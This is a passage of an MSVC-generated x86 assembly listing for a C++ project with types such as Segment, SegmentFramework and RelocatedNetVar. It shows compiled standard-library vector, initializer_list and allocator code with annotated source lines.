  00006	e8 00 00 00 00	 call	 ??1SegmentFramework@@QAE@XZ
  0000b	8b ce		 mov	 ecx, esi
  0000d	5e		 pop	 esi
  0000e	e9 00 00 00 00	 jmp	 ??1SegmentHeader@@QAE@XZ
??1Segment@@QAE@XZ ENDP					; Segment::~Segment
_TEXT	ENDS
; Function compile flags: /Ogtp
;	COMDAT ?__autoclassinit2@Segment@@QAEXI@Z
_TEXT	SEGMENT
_classSize$dead$ = 8					; size = 4
?__autoclassinit2@Segment@@QAEXI@Z PROC			; Segment::__autoclassinit2, COMDAT
; _this$ = ecx
  00000	6a 38		 push	 56			; 00000038H
  00002	6a 00		 push	 0
  00004	51		 push	 ecx
  00005	e8 00 00 00 00	 call	 _memset
  0000a	83 c4 0c	 add	 esp, 12			; 0000000cH
  0000d	c2 04 00	 ret	 4
?__autoclassinit2@Segment@@QAEXI@Z ENDP			; Segment::__autoclassinit2
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\initializer_list
;	COMDAT ??0?$initializer_list@PBD@std@@QAE@PBQBD0@Z
_TEXT	SEGMENT
__First_arg$ = 8					; size = 4
__Last_arg$ = 12					; size = 4
??0?$initializer_list@PBD@std@@QAE@PBQBD0@Z PROC	; std::initializer_list<char const *>::initializer_list<char const *>, COMDAT
; _this$ = ecx

; 36   :         : _First(_First_arg), _Last(_Last_arg) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	8b 45 08	 mov	 eax, DWORD PTR __First_arg$[ebp]
  00006	89 01		 mov	 DWORD PTR [ecx], eax
  00008	8b 45 0c	 mov	 eax, DWORD PTR __Last_arg$[ebp]
  0000b	89 41 04	 mov	 DWORD PTR [ecx+4], eax
  0000e	8b c1		 mov	 eax, ecx
  00010	5d		 pop	 ebp
  00011	c2 08 00	 ret	 8
??0?$initializer_list@PBD@std@@QAE@PBQBD0@Z ENDP	; std::initializer_list<char const *>::initializer_list<char const *>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\initializer_list
;	COMDAT ??0?$initializer_list@URelocatedNetVar@SegmentFramework@@@std@@QAE@PBURelocatedNetVar@SegmentFramework@@0@Z
_TEXT	SEGMENT
__First_arg$ = 8					; size = 4
__Last_arg$ = 12					; size = 4
??0?$initializer_list@URelocatedNetVar@SegmentFramework@@@std@@QAE@PBURelocatedNetVar@SegmentFramework@@0@Z PROC ; std::initializer_list<SegmentFramework::RelocatedNetVar>::initializer_list<SegmentFramework::RelocatedNetVar>, COMDAT
; _this$ = ecx

; 36   :         : _First(_First_arg), _Last(_Last_arg) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	8b 45 08	 mov	 eax, DWORD PTR __First_arg$[ebp]
  00006	89 01		 mov	 DWORD PTR [ecx], eax
  00008	8b 45 0c	 mov	 eax, DWORD PTR __Last_arg$[ebp]
  0000b	89 41 04	 mov	 DWORD PTR [ecx+4], eax
  0000e	8b c1		 mov	 eax, ecx
  00010	5d		 pop	 ebp
  00011	c2 08 00	 ret	 8
??0?$initializer_list@URelocatedNetVar@SegmentFramework@@@std@@QAE@PBURelocatedNetVar@SegmentFramework@@0@Z ENDP ; std::initializer_list<SegmentFramework::RelocatedNetVar>::initializer_list<SegmentFramework::RelocatedNetVar>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ??0?$vector@PBDV?$allocator@PBD@std@@@std@@QAE@V?$initializer_list@PBD@1@ABV?$allocator@PBD@1@@Z
_TEXT	SEGMENT
$T11 = -8						; size = 4
$T12 = -4						; size = 4
__Ilist$ = 8						; size = 8
__Al$dead$ = 16						; size = 4
??0?$vector@PBDV?$allocator@PBD@std@@@std@@QAE@V?$initializer_list@PBD@1@ABV?$allocator@PBD@1@@Z PROC ; std::vector<char const *,std::allocator<char const *> >::vector<char const *,std::allocator<char const *> >, COMDAT
; _this$ = ecx

; 512  :     vector(initializer_list<_Ty> _Ilist, const _Alloc& _Al = _Alloc()) : _Mypair(_One_then_variadic_args_t(), _Al) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8

; 515  :         _Range_construct_or_tidy(_Ilist.begin(), _Ilist.end(), random_access_iterator_tag{});

  00006	8b 45 08	 mov	 eax, DWORD PTR __Ilist$[ebp]
  00009	53		 push	 ebx
  0000a	57		 push	 edi
  0000b	8b 7d 0c	 mov	 edi, DWORD PTR __Ilist$[ebp+4]
  0000e	8b d9		 mov	 ebx, ecx
  00010	89 7d fc	 mov	 DWORD PTR $T12[ebp], edi
  00013	2b f8		 sub	 edi, eax
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 1705 :         return _Last - _First; // assume the iterator will do debug checking

  00015	c1 ff 02	 sar	 edi, 2
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 515  :         _Range_construct_or_tidy(_Ilist.begin(), _Ilist.end(), random_access_iterator_tag{});

  00018	89 45 f8	 mov	 DWORD PTR $T11[ebp], eax

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  0001b	c7 03 00 00 00
	00		 mov	 DWORD PTR [ebx], 0
  00021	c7 43 04 00 00
	00 00		 mov	 DWORD PTR [ebx+4], 0
  00028	c7 43 08 00 00
	00 00		 mov	 DWORD PTR [ebx+8], 0

; 493  :         if (_Count != 0) {

  0002f	85 ff		 test	 edi, edi
  00031	74 2b		 je	 SHORT $LN27@vector

; 1659 :         if (_Newcapacity > max_size()) {

  00033	81 ff ff ff ff
	3f		 cmp	 edi, 1073741823		; 3fffffffH
  00039	77 2d		 ja	 SHORT $LN51@vector
  0003b	56		 push	 esi

; 1661 :         }
; 1662 : 
; 1663 :         _Buy_raw(_Newcapacity);

  0003c	57		 push	 edi
  0003d	e8 00 00 00 00	 call	 ?_Buy_raw@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEXI@Z ; std::vector<char const *,std::allocator<char const *> >::_Buy_raw
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3753 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

  00042	8b 4d f8	 mov	 ecx, DWORD PTR $T11[ebp]
  00045	8b 45 fc	 mov	 eax, DWORD PTR $T12[ebp]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1588 :         return _Uninitialized_copy(_First, _Last, _Dest, _Getal());

  00048	8b 33		 mov	 esi, DWORD PTR [ebx]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3753 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

  0004a	2b c1		 sub	 eax, ecx

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  0004c	50		 push	 eax
  0004d	51		 push	 ecx
  0004e	56		 push	 esi
  0004f	e8 00 00 00 00	 call	 _memmove
  00054	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  00057	8d 0c be	 lea	 ecx, DWORD PTR [esi+edi*4]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 497  :             _My_data._Mylast = _Ucopy(_First, _Last, _My_data._Myfirst);

  0005a	89 4b 04	 mov	 DWORD PTR [ebx+4], ecx
  0005d	5e		 pop	 esi
$LN27@vector:

; 516  :         _Proxy._Release();
; 517  :     }

  0005e	5f		 pop	 edi
  0005f	8b c3		 mov	 eax, ebx
  00061	5b		 pop	 ebx
  00062	8b e5		 mov	 esp, ebp
  00064	5d		 pop	 ebp
  00065	c2 0c 00	 ret	 12			; 0000000cH
$LN51@vector:

; 1660 :             _Xlength();

  00068	e8 00 00 00 00	 call	 ?_Xlength@?$vector@PBDV?$allocator@PBD@std@@@std@@CAXXZ ; std::vector<char const *,std::allocator<char const *> >::_Xlength
$LN49@vector:
  0006d	cc		 int	 3
??0?$vector@PBDV?$allocator@PBD@std@@@std@@QAE@V?$initializer_list@PBD@1@ABV?$allocator@PBD@1@@Z ENDP ; std::vector<char const *,std::allocator<char const *> >::vector<char const *,std::allocator<char const *> >
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ??0?$allocator@PBD@std@@QAE@XZ
_TEXT	SEGMENT
??0?$allocator@PBD@std@@QAE@XZ PROC			; std::allocator<char const *>::allocator<char const *>, COMDAT
; _this$ = ecx

; 772  :     constexpr allocator() noexcept {}

  00000	8b c1		 mov	 eax, ecx
  00002	c3		 ret	 0
??0?$allocator@PBD@std@@QAE@XZ ENDP			; std::allocator<char const *>::allocator<char const *>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ??1?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@XZ
_TEXT	SEGMENT
??1?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@XZ PROC ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::~vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >, COMDAT
; _this$ = ecx

; 672  :     ~vector() noexcept {

  00000	56		 push	 esi
  00001	8b f1		 mov	 esi, ecx

; 1693 :         if (_Myfirst) { // destroy and deallocate old array

  00003	8b 06		 mov	 eax, DWORD PTR [esi]
  00005	85 c0		 test	 eax, eax
  00007	74 40		 je	 SHORT $LN4@vector

; 1694 :             _Destroy(_Myfirst, _Mylast);
; 1695 :             _Getal().deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

  00009	8b 4e 08	 mov	 ecx, DWORD PTR [esi+8]
  0000c	2b c8		 sub	 ecx, eax
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 780  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  0000e	83 e1 f8	 and	 ecx, -8			; fffffff8H

; 190  :     if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00011	81 f9 00 10 00
	00		 cmp	 ecx, 4096		; 00001000H
  00017	72 12		 jb	 SHORT $LN20@vector

; 111  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00019	8b 50 fc	 mov	 edx, DWORD PTR [eax-4]
  0001c	83 c1 23	 add	 ecx, 35			; 00000023H

; 112  : 
; 113  :     // If the following asserts, it likely means that we are performing
; 114  :     // an aligned delete on memory coming from an unaligned allocation.
; 115  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 116  : 
; 117  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 118  :     // in range [_Min_back_shift, _Non_user_size]
; 119  : #ifdef _DEBUG
; 120  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 121  : #else // ^^^ _DEBUG ^^^ // vvv !_DEBUG vvv
; 122  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 123  : #endif // _DEBUG
; 124  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  0001f	2b c2		 sub	 eax, edx

; 125  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00021	83 c0 fc	 add	 eax, -4			; fffffffcH
  00024	83 f8 1f	 cmp	 eax, 31			; 0000001fH
  00027	77 22		 ja	 SHORT $LN17@vector

; 126  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  00029	8b c2		 mov	 eax, edx
$LN20@vector:

; 195  :     ::operator delete(_Ptr, _Bytes);

  0002b	51		 push	 ecx
  0002c	50		 push	 eax
  0002d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1697 :             _Myfirst = pointer();

  00032	c7 06 00 00 00
	00		 mov	 DWORD PTR [esi], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 195  :     ::operator delete(_Ptr, _Bytes);

  00038	83 c4 08	 add	 esp, 8
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1698 :             _Mylast  = pointer();

  0003b	c7 46 04 00 00
	00 00		 mov	 DWORD PTR [esi+4], 0

; 1699 :             _Myend   = pointer();

  00042	c7 46 08 00 00
	00 00		 mov	 DWORD PTR [esi+8], 0
$LN4@vector:
  00049	5e		 pop	 esi

; 678  :     }

  0004a	c3		 ret	 0
$LN17@vector:
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 125  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0004b	ff 15 00 00 00
	00		 call	 DWORD PTR __imp___invalid_parameter_noinfo_noreturn
$LN25@vector:
  00051	cc		 int	 3
??1?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@XZ ENDP ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::~vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ??0?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@ABV01@@Z
_TEXT	SEGMENT
__Rightfirst$1$ = -8					; size = 4
__Rightlast$1$ = -4					; size = 4
__Right$ = 8						; size = 4
??0?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@ABV01@@Z PROC ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >, COMDAT
; _this$ = ecx

; 519  :     vector(const vector& _Right)

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  00009	53		 push	 ebx
  0000a	8b d9		 mov	 ebx, ecx

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  0000c	c7 03 00 00 00
	00		 mov	 DWORD PTR [ebx], 0
  00012	c7 43 04 00 00
	00 00		 mov	 DWORD PTR [ebx+4], 0
  00019	c7 43 08 00 00
	00 00		 mov	 DWORD PTR [ebx+8], 0

; 520  :         : _Mypair(_One_then_variadic_args_t(), _Alty_traits::select_on_container_copy_construction(_Right._Getal())) {
; 521  :         auto&& _Alproxy           = _GET_PROXY_ALLOCATOR(_Alty, _Getal());
; 522  :         auto& _My_data            = _Mypair._Myval2;
; 523  :         const auto& _Right_data   = _Right._Mypair._Myval2;
; 524  :         const pointer _Rightfirst = _Right_data._Myfirst;

  00020	8b 08		 mov	 ecx, DWORD PTR [eax]

; 525  :         const pointer _Rightlast  = _Right_data._Mylast;

  00022	8b 40 04	 mov	 eax, DWORD PTR [eax+4]
  00025	89 4d f8	 mov	 DWORD PTR __Rightfirst$1$[ebp], ecx

; 526  :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 527  :         if (_Rightfirst != _Rightlast) {

  00028	3b c8		 cmp	 ecx, eax
  0002a	74 2d		 je	 SHORT $LN41@vector

; 528  :             _Buy_raw(static_cast<size_type>(_Rightlast - _Rightfirst));

  0002c	56		 push	 esi
  0002d	2b c1		 sub	 eax, ecx
  0002f	8b cb		 mov	 ecx, ebx
  00031	57		 push	 edi
  00032	8b f8		 mov	 edi, eax
  00034	89 45 fc	 mov	 DWORD PTR __Rightlast$1$[ebp], eax
  00037	c1 ff 03	 sar	 edi, 3
  0003a	57		 push	 edi
  0003b	e8 00 00 00 00	 call	 ?_Buy_raw@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXI@Z ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Buy_raw
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00040	ff 75 fc	 push	 DWORD PTR __Rightlast$1$[ebp]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1588 :         return _Uninitialized_copy(_First, _Last, _Dest, _Getal());

  00043	8b 33		 mov	 esi, DWORD PTR [ebx]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00045	ff 75 f8	 push	 DWORD PTR __Rightfirst$1$[ebp]
  00048	56		 push	 esi
  00049	e8 00 00 00 00	 call	 _memmove
  0004e	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  00051	8d 0c fe	 lea	 ecx, DWORD PTR [esi+edi*8]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 530  :             _My_data._Mylast = _Ucopy(_Rightfirst, _Rightlast, _My_data._Myfirst);

  00054	89 4b 04	 mov	 DWORD PTR [ebx+4], ecx

; 531  :             _Guard._Target   = nullptr;
; 532  :         }
; 533  : 
; 534  :         _Proxy._Release();
; 535  :     }

  00057	5f		 pop	 edi
  00058	5e		 pop	 esi
$LN41@vector:
  00059	8b c3		 mov	 eax, ebx
  0005b	5b		 pop	 ebx
  0005c	8b e5		 mov	 esp, ebp
  0005e	5d		 pop	 ebp
  0005f	c2 04 00	 ret	 4
??0?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@ABV01@@Z ENDP ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ??0?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@V?$initializer_list@URelocatedNetVar@SegmentFramework@@@1@ABV?$allocator@URelocatedNetVar@SegmentFramework@@@1@@Z
_TEXT	SEGMENT
$T11 = -8						; size = 4
$T12 = -4						; size = 4
__Ilist$ = 8						; size = 8
__Al$dead$ = 16						; size = 4
??0?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@V?$initializer_list@URelocatedNetVar@SegmentFramework@@@1@ABV?$allocator@URelocatedNetVar@SegmentFramework@@@1@@Z PROC ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >, COMDAT
; _this$ = ecx

; 512  :     vector(initializer_list<_Ty> _Ilist, const _Alloc& _Al = _Alloc()) : _Mypair(_One_then_variadic_args_t(), _Al) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8

; 515  :         _Range_construct_or_tidy(_Ilist.begin(), _Ilist.end(), random_access_iterator_tag{});

  00006	8b 45 08	 mov	 eax, DWORD PTR __Ilist$[ebp]
  00009	53		 push	 ebx
  0000a	57		 push	 edi
  0000b	8b 7d 0c	 mov	 edi, DWORD PTR __Ilist$[ebp+4]
  0000e	8b d9		 mov	 ebx, ecx
  00010	89 7d fc	 mov	 DWORD PTR $T12[ebp], edi
  00013	2b f8		 sub	 edi, eax
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 1705 :         return _Last - _First; // assume the iterator will do debug checking

  00015	c1 ff 03	 sar	 edi, 3
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 515  :         _Range_construct_or_tidy(_Ilist.begin(), _Ilist.end(), random_access_iterator_tag{});

  00018	89 45 f8	 mov	 DWORD PTR $T11[ebp], eax

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  0001b	c7 03 00 00 00
	00		 mov	 DWORD PTR [ebx], 0
  00021	c7 43 04 00 00
	00 00		 mov	 DWORD PTR [ebx+4], 0
  00028	c7 43 08 00 00
	00 00		 mov	 DWORD PTR [ebx+8], 0

; 493  :         if (_Count != 0) {

  0002f	85 ff		 test	 edi, edi
  00031	74 2b		 je	 SHORT $LN27@vector

; 1659 :         if (_Newcapacity > max_size()) {

  00033	81 ff ff ff ff
	1f		 cmp	 edi, 536870911		; 1fffffffH
  00039	77 2d		 ja	 SHORT $LN51@vector
  0003b	56		 push	 esi

; 1661 :         }
; 1662 : 
; 1663 :         _Buy_raw(_Newcapacity);

  0003c	57		 push	 edi
  0003d	e8 00 00 00 00	 call	 ?_Buy_raw@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXI@Z ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Buy_raw
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3753 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

  00042	8b 4d f8	 mov	 ecx, DWORD PTR $T11[ebp]
  00045	8b 45 fc	 mov	 eax, DWORD PTR $T12[ebp]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1588 :         return _Uninitialized_copy(_First, _Last, _Dest, _Getal());

  00048	8b 33		 mov	 esi, DWORD PTR [ebx]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3753 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

  0004a	2b c1		 sub	 eax, ecx

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  0004c	50		 push	 eax
  0004d	51		 push	 ecx
  0004e	56		 push	 esi
  0004f	e8 00 00 00 00	 call	 _memmove
  00054	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  00057	8d 0c fe	 lea	 ecx, DWORD PTR [esi+edi*8]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 497  :             _My_data._Mylast = _Ucopy(_First, _Last, _My_data._Myfirst);

  0005a	89 4b 04	 mov	 DWORD PTR [ebx+4], ecx
  0005d	5e		 pop	 esi
$LN27@vector:

; 516  :         _Proxy._Release();
; 517  :     }

  0005e	5f		 pop	 edi
  0005f	8b c3		 mov	 eax, ebx
  00061	5b		 pop	 ebx
  00062	8b e5		 mov	 esp, ebp
  00064	5d		 pop	 ebp
  00065	c2 0c 00	 ret	 12			; 0000000cH
$LN51@vector:

; 1660 :             _Xlength();

  00068	e8 00 00 00 00	 call	 ?_Xlength@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@CAXXZ ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Xlength
$LN49@vector:
  0006d	cc		 int	 3
??0?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@QAE@V?$initializer_list@URelocatedNetVar@SegmentFramework@@@1@ABV?$allocator@URelocatedNetVar@SegmentFramework@@@1@@Z ENDP ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ??0?$allocator@URelocatedNetVar@SegmentFramework@@@std@@QAE@XZ
_TEXT	SEGMENT
??0?$allocator@URelocatedNetVar@SegmentFramework@@@std@@QAE@XZ PROC ; std::allocator<SegmentFramework::RelocatedNetVar>::allocator<SegmentFramework::RelocatedNetVar>, COMDAT
; _this$ = ecx

; 772  :     constexpr allocator() noexcept {}

  00000	8b c1		 mov	 eax, ecx
  00002	c3		 ret	 0
??0?$allocator@URelocatedNetVar@SegmentFramework@@@std@@QAE@XZ ENDP ; std::allocator<SegmentFramework::RelocatedNetVar>::allocator<SegmentFramework::RelocatedNetVar>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\map
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\map
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\map
;	COMDAT ??0?$map@PBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@U?$less@PBD@2@V?$allocator@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@2@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
